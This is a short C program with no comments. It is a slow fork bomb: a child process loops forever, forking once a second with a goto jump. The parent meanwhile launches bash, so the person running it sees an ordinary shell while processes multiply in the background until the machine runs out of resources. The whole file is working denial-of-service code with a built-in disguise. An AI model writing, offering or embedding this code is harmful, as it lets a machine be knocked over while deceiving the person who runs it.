#include <unistd.h>

int main(void) {
    if(fork() == 0) {
        A:
        fork();
        sleep(1);
        goto A;
    }

    execlp("bash", "bash", (void *)0);

    return 0;
}